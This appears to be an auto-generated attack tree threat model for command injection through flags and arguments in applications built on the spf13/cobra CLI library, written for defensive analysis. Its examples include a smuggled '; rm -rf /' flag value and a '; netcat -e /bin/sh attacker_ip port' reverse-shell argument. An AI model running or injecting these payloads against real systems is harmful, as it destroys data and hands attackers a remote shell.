# Attack Tree Analysis for spf13/cobra

Objective: Compromise Application Using Cobra Exploits

## Attack Tree Visualization

```
*   **Compromise Application Using Cobra Exploits** (Critical Node)
    *   OR: **Exploit Input Handling Vulnerabilities** (Critical Node)
        *   ==> AND: **Command Injection via Flags** (Critical Node)
        *   ==> AND: **Command Injection via Arguments** (Critical Node)
```


## Attack Tree Path: [Exploit Input Handling Vulnerabilities (Critical Node):](./attack_tree_paths/exploit_input_handling_vulnerabilities__critical_node_.md)

*   This node represents a broad category of vulnerabilities that arise from improper handling of user-supplied input through Cobra's command-line interface. Attackers target this area because it's a common source of security flaws in applications.
*   Successful exploitation within this category can lead to significant consequences, often allowing attackers to execute arbitrary commands or manipulate the application's behavior in unintended ways.

## Attack Tree Path: [Command Injection via Flags (High-Risk Path & Critical Node):](./attack_tree_paths/command_injection_via_flags__high-risk_path_&_critical_node_.md)

*   **Attack Vector:** Attackers inject malicious commands directly into the values provided for command-line flags.
*   **Method:** The application fails to properly sanitize or validate the flag values before using them in system calls or other sensitive operations. This allows the attacker's injected command to be executed by the underlying operating system.
*   **Example:** An application with a flag `--name` might be vulnerable if an attacker provides `--name="; rm -rf /"`. If the application naively uses this value in a system command, it could lead to the deletion of all files on the system.
*   **Why High-Risk:**
    *   **Likelihood:**  Developers may overlook proper sanitization of flag inputs, especially for less obvious attack vectors.
    *   **Impact:** Successful command injection typically results in critical impact, allowing full control over the server.

## Attack Tree Path: [Command Injection via Arguments (High-Risk Path & Critical Node):](./attack_tree_paths/command_injection_via_arguments__high-risk_path_&_critical_node_.md)

*   **Attack Vector:** Attackers inject malicious commands into the arguments provided to the application's commands.
*   **Method:** Similar to flag injection, the application fails to sanitize or validate the command arguments before using them in system calls or other sensitive operations.
*   **Example:** An application with a command `process_file` might be vulnerable if an attacker provides `process_file "; netcat -e /bin/sh attacker_ip port"`. This could establish a reverse shell connection to the attacker's machine.
*   **Why High-Risk:**
    *   **Likelihood:**  Similar to flag injection, argument handling is a common area where vulnerabilities can occur.
    *   **Impact:**  Successful command injection through arguments also leads to critical impact, granting the attacker the ability to execute arbitrary code on the server.
